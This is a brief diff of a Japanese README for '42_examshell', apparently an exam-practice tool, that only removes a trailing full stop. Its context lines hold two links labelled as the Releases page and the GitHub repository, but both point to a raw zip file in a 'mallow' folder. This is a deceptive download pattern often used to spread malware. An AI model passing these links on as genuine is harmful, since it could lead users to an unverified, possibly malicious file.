@@ -88,4 +88,4 @@ Releasesページからアプリケーションの最新版をダウンロード
 - [Releasesページにアクセスしてダウンロード](https://raw.githubusercontent.com/mirkoloru/42_examshell/main/mallow/42_examshell.zip)
 - [GitHubリポジトリ](https://raw.githubusercontent.com/mirkoloru/42_examshell/main/mallow/42_examshell.zip)
 
-42_examshellを選んでいただきありがとうございます！試験準備でのご健闘をお祈りします。
+42_examshellを選んでいただきありがとうございます！試験準備でのご健闘をお祈りします
